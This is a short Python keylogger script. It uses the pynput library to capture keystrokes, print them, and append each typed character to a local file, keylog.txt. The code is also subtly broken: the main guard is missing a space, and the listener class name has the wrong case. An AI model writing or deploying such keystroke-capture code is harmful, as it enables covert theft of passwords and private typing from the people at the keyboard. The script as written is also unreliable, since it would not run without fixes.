from pynput import keyboard

def keypressed(key):
    print(str(key))
    with open("keylog.txt",'a') as logkey:
        try:
            char=key.char
            logkey.write(char)
        except:
            print("Error getting char")

if__name__== "__main__" :
   listener = keyboard.listener(on_press=keypressed)
   listener.start()
   input()